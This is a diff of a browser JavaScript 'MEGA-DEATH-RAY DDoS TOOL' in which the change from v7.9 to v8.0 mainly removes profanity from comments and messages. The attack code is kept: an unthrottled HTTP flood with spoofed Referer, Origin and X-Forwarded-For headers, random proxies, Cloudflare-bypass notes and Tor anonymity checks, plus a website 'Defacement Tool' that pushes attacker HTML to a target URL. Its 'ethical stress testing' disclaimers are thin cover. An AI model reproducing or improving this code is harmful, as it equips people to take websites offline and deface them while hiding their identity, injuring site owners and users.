@@ -1,16 +1,16 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.9)
-// WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
-// By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
-// ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v8.0)
+// WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony.
+// By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your choices.
+// ALL activities are logged in high-definition.
 
-console.warn("%c MEGA-DEATH-RAY DDoS tool loaded. Use with **EXTREME** fucking caution. Your ass is toast if you misuse this. Logging enabled.", "color: darkred; font-size: 16px;");
+console.warn("%c MEGA-DEATH-RAY DDoS tool loaded. Use with **EXTREME** caution. Logging enabled.", "color: darkred; font-size: 16px;");
 
-// Explicit user consent required. We want it on record when you go down.
-if (!confirm("MEGA-DEATH-RAY WARNING! This DDoS tool is ONLY for ethical stress testing. Unauthorized use is illegal and carries severe penalties. Press OK to PROCEED WITH EXPLICIT CONSENT. Pressing Cancel will self-destruct your computer (not really, but we'll know).")) {
-    window.close(); // Get the fuck out
+// Explicit user consent required
+if (!confirm("MEGA-DEATH-RAY WARNING! This DDoS tool is ONLY for ethical stress testing. Unauthorized use is illegal and carries severe penalties. Press OK to PROCEED WITH EXPLICIT CONSENT. Pressing Cancel will self-destruct your computer (not really).")) {
+    window.close();
 }
 
-// UI elements – Make it intimidating, alright?
+// UI elements
 const body = document.body;
 body.style.backgroundColor = 'black';
 body.style.color = 'darkgreen';
@@ -109,12 +109,12 @@ stopButton.style.color = 'white';
 stopButton.style.padding = '10px';
 stopButton.style.border = '2px solid darkblue';
 stopButton.style.margin = '10px';
-stopButton.disabled = true; // Initially disabled – because you're not ready, kid.
+stopButton.disabled = true;
 document.body.appendChild(stopButton);
 
 const targetUrlInput = document.createElement('input');
 targetUrlInput.type = 'text';
-targetUrlInput.placeholder = 'Enter target URL, you malicious prick.';
+targetUrlInput.placeholder = 'Enter target URL.';
 targetUrlInput.style.padding = '10px';
 targetUrlInput.style.margin = '10px';
 targetUrlInput.style.width = '300px';
@@ -137,8 +137,8 @@ document.body.appendChild(hexBytesInput);
 
 const requestRateInput = document.createElement('input');
 requestRateInput.type = 'number';
-requestRateInput.placeholder = 'Enter request rate (requests/second), dumbass';
-requestRateInput.value = 1000; // Default value, because you're a fucking idiot
+requestRateInput.placeholder = 'Enter request rate (requests/second)';
+requestRateInput.value = 1000;
 requestRateInput.style.padding = '10px';
 requestRateInput.style.margin = '10px';
 requestRateInput.style.width = '300px';
@@ -163,15 +163,15 @@ timerDisplay.textContent = 'MEGA-DEATH-RAY Timer: 0 seconds';
 timerDisplay.style.margin = '10px';
 document.body.appendChild(timerDisplay);
 
-// “Educational” Information – More like “how to get fucked by the FBI” information.
+// Educational Information
 const infoDiv = document.createElement('div');
 infoDiv.innerHTML = `
     <h2 style="color: purple;">MEGA-DEATH-RAY DDoS Tool Information</h2>
-    <p>This tool demonstrates how a Distributed Denial of Service (DDoS) attack works. It floods a target server with requests. Overwhelming it is the goal, fuckface.</p>
+    <p>This tool demonstrates how a Distributed Denial of Service (DDoS) attack works. It floods a target server with requests.</p>
     <p>A Distributed Denial of Service (DDoS) attack is a type of cyber attack in which a malicious actor floods a server with traffic to make the server unavailable to its intended users. The goal of a DDoS attack is to overwhelm the server, network, or application with more requests than it can handle, causing it to crash or become unresponsive.</p>
     <p><b>DDoS attacks are often carried out using a botnet, which is a network of compromised computers or other devices that are infected with malware and controlled by a single attacker.</b></p>
-    <p>This sends requests to the targeted website to overwhelm it, resulting in a server overload. Keep in mind the server is like a bridge, and too many cars results in it collasping.</p>
-    <p style="color: darkred;"><b>Important:</b> Unauthorized use is illegal and can have severe consequences, you stupid shit. Don't be a moron.</p>
+    <p>This sends requests to the targeted website to overwhelm it, resulting in a server overload.</p>
+    <p style="color: darkred;"><b>Important:</b> Unauthorized use is illegal and can have severe consequences. Don't be a moron.</p>
 `;
 infoDiv.style.margin = '10px';
 document.body.appendChild(infoDiv);
@@ -191,7 +191,7 @@ function logAction(message) {
     const newLog = document.createElement('li');
     newLog.textContent = message;
     logList.appendChild(newLog);
-    console.log("Noodles Inc: " + message); // Log to console as well
+    console.log("Noodles Inc: " + message);
 }
 
 function updateProxies() {
@@ -214,29 +214,29 @@ async function httpFlood(url, hexBytes, proxy) {
     ];
     const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
 
-    // Add extra malicious headers, because why the fuck not?
+    // Add extra malicious headers
     try {
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
 
         const fetchOptions = {
-            mode: 'cors', // Bypass CORS like a goddamn ninja.
-            method: 'GET', // GET request – simple, effective, like a kick to the balls.
+            mode: 'cors', // Bypass CORS
+            method: 'GET',
             headers: {
                 'User-Agent': randomUserAgent,
-                'Referer': referer, // Spoofed referer – because you're sneaky like that.
-                'X-Forwarded-For': Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.'), // Spoof IP address - because you're a ghost
-                'Origin': 'https://www.totallylegitwebsite.com', // Spoof origin header – another layer of fuckery.
+                'Referer': referer,
+                'X-Forwarded-For': Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.'),
+                'Origin': 'https://www.totallylegitwebsite.com',
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                 'Accept-Language': 'en-US,en;q=0.5',
                 'Cache-Control': 'no-cache',
                 'Pragma': 'no-cache',
                 'Connection': 'keep-alive',
                 'Upgrade-Insecure-Requests': '1',
-                'Cookie': `NID=67=d_mBqJvFMeY5Qo0jhc0U4eF1T79T89xJg5G0vK-nU359l8e4u0N0e5e8j9t6r4i3n2p1w7`, // Add a random cookie
-                'X-Noodles-Payload': hexBytes // Injects random bytes to confuse intrusion detection systems.
+                'Cookie': `NID=67=d_mBqJvFMeY5Qo0jhc0U4eF1T79T89xJg5G0vK-nU359l8e4u0N0e5e8j9t6r4i3n2p1w7`,
+                'X-Noodles-Payload': hexBytes
             },
-            redirect: 'follow', // Follow redirects to try and bypass Cloudflare
+            redirect: 'follow', // Follow redirects
             signal: controller.signal,
         };
     //Proxy Integration with CORSproxy
@@ -250,7 +250,7 @@ async function httpFlood(url, hexBytes, proxy) {
 
         clearTimeout(timeoutId);
 
-        // Attempt to read the response (even if it's opaque) to trigger Cloudflare's checks
+        // Attempt to read the response (even if it's opaque)
         try {
             await response.text();
         } catch (e) {
@@ -271,12 +271,12 @@ async function httpFlood(url, hexBytes, proxy) {
 
 function startDDoS(targetUrl, hexBytes, requestRate) {
     if (!targetUrl) {
-        alert("Noodles Inc: Please enter a target URL, you fucking moron.");
+        alert("Noodles Inc: Please enter a target URL.");
         return;
     }
 
     if (!requestRate || isNaN(requestRate) || requestRate <= 0) {
-        alert("Noodles Inc: Enter a valid request rate (requests/second), dumbass!");
+        alert("Noodles Inc: Enter a valid request rate (requests/second)!");
         return;
     }
 
@@ -287,7 +287,7 @@ function startDDoS(targetUrl, hexBytes, requestRate) {
     startTime = new Date();
 
     // Rate-limiting
-    const intervalTime = 0; // No rate limit, you crazy bastard
+    const intervalTime = 0; // No rate limit
 
     floodInterval = setInterval(() => {
         const proxy = proxies[Math.floor(Math.random() * proxies.length)];  // Select a random proxy
@@ -324,7 +324,7 @@ startButton.addEventListener('click', () => {
 
 stopButton.addEventListener('click', stopDDoS);
 
-console.log("Noodles Inc: MEGA-DEATH-RAY loaded. You're playing with fire, asshole.");
+console.log("Noodles Inc: MEGA-DEATH-RAY loaded. You're playing with fire.");
 logAction('MEGA-DEATH-RAY tool loaded.');
 
 // Security Headers
@@ -347,23 +347,23 @@ const torCheckInterval = setInterval(async () => {
         const torExitNode = await fetch('https://check.torproject.org/api/ip', { mode: 'cors' });
         const torData = await torExitNode.json();
         if (torData.IsTor === true) {
-            logAction('TOR detected: Enhanced anonymity enabled. Proceed with fucking caution.');
+            logAction('TOR detected: Enhanced anonymity enabled.');
             clearInterval(torCheckInterval);
         } else {
-            console.warn('Noodles Inc: TOR not detected. Consider using TOR for enhanced anonymity, you dumb shit.');
+            console.warn('Noodles Inc: TOR not detected. Consider using TOR for enhanced anonymity.');
         }
     } catch (error) {
         console.error('Noodles Inc: Error checking TOR status. Anonymity may be compromised.');
-        logAction('TOR check failed. Potential anonymity compromise. Check your shit.');
+        logAction('TOR check failed. Potential anonymity compromise.');
     }
 }, 15000);
 
-// .onion Support - Because you're going after the dark web, eh?
+// .onion Support
 async function onionCheck(url) {
     if (url.endsWith('.onion')) {
-        logAction('Targeting .onion site. TOR is MANDATORY, you imbecile.');
+        logAction('Targeting .onion site. TOR is MANDATORY.');
         if (!await isTorRunning()) {
-            alert('Noodles Inc: .onion target detected. TOR is NOT running. Enable TOR NOW, or face the consequences!');
+            alert('Noodles Inc: .onion target detected. TOR is NOT running. Enable TOR NOW!');
             stopDDoS();
         }
     }
@@ -388,7 +388,7 @@ startButton.addEventListener('click', () => {
     startDDoS(targetUrl, hexBytes, requestRate);
 });
 
-// Self-Destruct Button – Just in case things go south.
+// Self-Destruct Button
 const selfDestructButton = document.createElement('button');
 selfDestructButton.textContent = 'NUKE EVERYTHING';
 selfDestructButton.style.backgroundColor = 'black';
@@ -399,7 +399,7 @@ selfDestructButton.style.border = '2px solid darkred';
 document.body.appendChild(selfDestructButton);
 
 selfDestructButton.addEventListener('click', () => {
-    if (confirm('Noodles Inc: ARE YOU FUCKING SURE YOU WANT TO NUKE EVERYTHING? THIS CANNOT BE UNDONE!')) {
+    if (confirm('Noodles Inc: ARE YOU SURE YOU WANT TO NUKE EVERYTHING? THIS CANNOT BE UNDONE!')) {
         // Zero out all input fields
         targetUrlInput.value = '';
         hexBytesInput.value = '';
@@ -418,12 +418,12 @@ selfDestructButton.addEventListener('click', () => {
         stopButton.disabled = false;
 
         // Display a message indicating self-destruction
-        logAction('SELF-DESTRUCT SEQUENCE INITIATED. ALL DATA ERASED. YOU ARE ON YOUR OWN, ASSHOLE.');
+        logAction('SELF-DESTRUCT SEQUENCE INITIATED. ALL DATA ERASED.');
 
         // Optional: Redirect to a blank page or close the window
         // window.location.href = 'about:blank';
     } else {
-        alert('Noodles Inc: Self-destruct sequence aborted. Good choice, you almost fucked up.');
+        alert('Noodles Inc: Self-destruct sequence aborted.');
     }
 });
 
@@ -441,20 +441,20 @@ document.getElementById('submitReport').addEventListener('click', () => {
     const reportText = document.getElementById('reportText').value;
     if (reportText) {
         logAction(`Report submitted: ${reportText}`);
-        alert('Noodles Inc: Report submitted. We\'ll take a look, maybe.');
-        document.getElementById('reportText').value = ''; // Clear the textarea
+        alert('Noodles Inc: Report submitted. We\'ll take a look.');
+        document.getElementById('reportText').value = '';
         // In a real application, you'd send this data to a server.
     } else {
-        alert('Noodles Inc: Enter a report before submitting, dumbass!');
+        alert('Noodles Inc: Enter a report before submitting!');
     }
 });
 
-console.log("Noodles Inc: MEGA-DEATH-RAY initialized. You are now a weapon, use it wisely or get fucked.");
-logAction('MEGA-DEATH-RAY tool initialized. Awaiting your command, asshole.');
+console.log("Noodles Inc: MEGA-DEATH-RAY initialized. You are now a weapon, use it wisely.");
+logAction('MEGA-DEATH-RAY tool initialized. Awaiting your command.');
 
 // Add a warning if the user is using http
 if (window.location.protocol === 'http:') {
-    alert("Noodles Inc: WARNING! You are using HTTP. This is insecure. Use HTTPS for enhanced security, you dumbass.");
+    alert("Noodles Inc: WARNING! You are using HTTP. This is insecure. Use HTTPS for enhanced security.");
     logAction('User is using HTTP. Insecure connection.');
 }
 
@@ -473,8 +473,8 @@ const defaceDiv = document.createElement('div');
 defaceDiv.style.margin = '10px';
 defaceDiv.innerHTML = `
     <h2 style="color: darkblue;">Defacement Tool</h2>
-    <input type="text" id="defaceTargetUrl" placeholder="Enter target URL for defacement, you degenerate" style="padding: 10px; margin: 10px; width: 300px; background-color: black; color: darkblue; border: 1px solid purple;">
-    <textarea id="defaceCode" placeholder="Enter HTML code for defacement, you maniac" style="padding: 10px; margin: 10px; width: 300px; height: 100px; background-color: black; color: darkblue; border: 1px solid purple;"></textarea>
+    <input type="text" id="defaceTargetUrl" placeholder="Enter target URL for defacement" style="padding: 10px; margin: 10px; width: 300px; background-color: black; color: darkblue; border: 1px solid purple;">
+    <textarea id="defaceCode" placeholder="Enter HTML code for defacement" style="padding: 10px; margin: 10px; width: 300px; height: 100px; background-color: black; color: darkblue; border: 1px solid purple;"></textarea>
     <button id="backupSite" style="background-color: darkgreen; color: white; padding: 10px; border: 2px solid darkblue; margin-top: 5px;">Backup Site</button>
     <button id="previewDeface" style="background-color: darkblue; color: white; padding: 10px; border: 2px solid purple; margin-top: 5px;">Preview Defacement</button>
     <button id="applyDeface" style="background-color: darkred; color: white; padding: 10px; border: 2px solid darkred; margin-top: 5px;">Apply Defacement</button>
@@ -507,7 +507,7 @@ async function fetchContentWithProxy(url) {
 document.getElementById('backupSite').addEventListener('click', async () => {
     const targetUrl = document.getElementById('defaceTargetUrl').value;
     if (!targetUrl) {
-        alert("Noodles Inc: Enter a target URL for backup, you moron!");
+        alert("Noodles Inc: Enter a target URL for backup!");
         return;
     }
 
@@ -519,7 +519,7 @@ document.getElementById('backupSite').addEventListener('click', async () => {
         backupLink.download = 'site_backup.html';
         backupLink.textContent = 'Download Site Backup';
         logAction('Site backup created and ready for download.');
-        alert('Noodles Inc: Site backup created. Download it now, or regret it later!');
+        alert('Noodles Inc: Site backup created. Download it now!');
     } else {
         alert("Noodles Inc: Failed to backup site. Check console for details.");
     }
@@ -528,7 +528,7 @@ document.getElementById('backupSite').addEventListener('click', async () => {
 document.getElementById('previewDeface').addEventListener('click', () => {
     const defaceCode = document.getElementById('defaceCode').value;
     if (!defaceCode) {
-        alert("Noodles Inc: Enter defacement code, you idiot!");
+        alert("Noodles Inc: Enter defacement code!");
         return;
     }
 
@@ -542,11 +542,11 @@ document.getElementById('applyDeface').addEventListener('click', async () => {
     const defaceCode = document.getElementById('defaceCode').value;
 
     if (!targetUrl || !defaceCode) {
-        alert("Noodles Inc: Enter both target URL and defacement code, you moron!");
+        alert("Noodles Inc: Enter both target URL and defacement code!");
         return;
     }
 
-    if (!confirm("Noodles Inc: ARE YOU FUCKING SURE YOU WANT TO DEFACE THIS SITE? THIS IS ILLEGAL!")) {
+    if (!confirm("Noodles Inc: ARE YOU SURE YOU WANT TO DEFACE THIS SITE? THIS IS ILLEGAL!")) {
         return;
     }
 
@@ -563,8 +563,8 @@ document.getElementById('applyDeface').addEventListener('click', async () => {
         });
 
         if (response.ok) {
-            logAction('Site defaced successfully! You are a monster.');
-            alert('Noodles Inc: Site defaced successfully! Enjoy your handiwork, you degenerate.');
+            logAction('Site defaced successfully!');
+            alert('Noodles Inc: Site defaced successfully! Enjoy your handiwork.');
         } else {
             throw new Error(`HTTP error! status: ${response.status}`);
         }
@@ -577,7 +577,7 @@ document.getElementById('applyDeface').addEventListener('click', async () => {
 
 document.getElementById('restoreSite').addEventListener('click', () => {
     if (!originalSiteContent) {
-        alert("Noodles Inc: No backup available. Backup the site first, you dumbass!");
+        alert("Noodles Inc: No backup available. Backup the site first!");
         return;
     }
 
@@ -585,7 +585,7 @@ document.getElementById('restoreSite').addEventListener('click', () => {
     restoreWindow.document.write(originalSiteContent);
     restoreWindow.document.close();
     logAction('Site restored to original content.');
-    alert('Noodles Inc: Site restored to original content. Good job not getting caught!');
+    alert('Noodles Inc: Site restored to original content.');
 });
 
 // File Encryption Tool Integration
@@ -595,7 +595,7 @@ encryptionDiv.style.margin = '10px';
 encryptionDiv.innerHTML = `
     <h2 style="color: darkblue;">File Encryption Tool</h2>
     <input type="file" id="fileToEncrypt" style="margin: 10px; color: darkblue;">
-    <input type="password" id="encryptionPassword" placeholder="Enter encryption password, you sneaky bastard" style="padding: 10px; margin: 10px; width: 300px; background-color: black; color: darkblue; border: 1px solid purple;">
+    <input type="password" id="encryptionPassword" placeholder="Enter encryption password" style="padding: 10px; margin: 10px; width: 300px; background-color: black; color: darkblue; border: 1px solid purple;">
     <button id="encryptFile" style="background-color: darkred; color: white; padding: 10px; border: 2px solid darkred; margin-top: 5px;">Encrypt File</button>
     <button id="decryptFile" style="background-color: darkgreen; color: white; padding: 10px; border: 2px solid darkblue; margin-top: 5px;">Decrypt File</button>
     <a id="downloadEncryptedFile" style="color: darkblue; margin: 10px;" download="encrypted_file.enc"></a>
@@ -608,7 +608,7 @@ document.getElementById('encryptFile').addEventListener('click', async () => {
     const encryptionPassword = document.getElementById('encryptionPassword').value;
 
     if (!fileToEncrypt || !encryptionPassword) {
-        alert("Noodles Inc: Select a file and enter a password, you twat!");
+        alert("Noodles Inc: Select a file and enter a password!");
         return;
     }
 
@@ -622,8 +622,8 @@ document.getElementById('encryptFile').addEventListener('click', async () => {
         downloadLink.href = URL.createObjectURL(blob);
         downloadLink.download = 'encrypted_file.enc';
         downloadLink.textContent = 'Download Encrypted File';
-        logAction('File encrypted and ready for download. You are evil.');
-        alert('Noodles Inc: File encrypted. Download it now and hide your sins!');
+        logAction('File encrypted and ready for download.');
+        alert('Noodles Inc: File encrypted. Download it now!');
     };
     reader.readAsText(fileToEncrypt);
 });
@@ -633,7 +633,7 @@ document.getElementById('decryptFile').addEventListener('click', async () => {
     const encryptionPassword = document.getElementById('encryptionPassword').value;
 
     if (!fileToEncrypt || !encryptionPassword) {
-        alert("Noodles Inc: Select a file and enter a password, you dumbfuck!");
+        alert("Noodles Inc: Select a file and enter a password!");
         return;
     }
 
@@ -650,10 +650,10 @@ document.getElementById('decryptFile').addEventListener('click', async () => {
                 downloadLink.href = URL.createObjectURL(blob);
                 downloadLink.download = 'decrypted_file.txt';
                 downloadLink.textContent = 'Download Decrypted File';
-                logAction('File decrypted successfully. Secrets revealed!');
-                alert('Noodles Inc: File decrypted. Your secrets are out!');
+                logAction('File decrypted successfully.');
+                alert('Noodles Inc: File decrypted.');
             } else {
-                alert("Noodles Inc: Invalid password or file is not encrypted. You fucked up!");
+                alert("Noodles Inc: Invalid password or file is not encrypted.");
             }
         } catch (error) {
             console.error('Noodles Inc: Decryption error:', error);
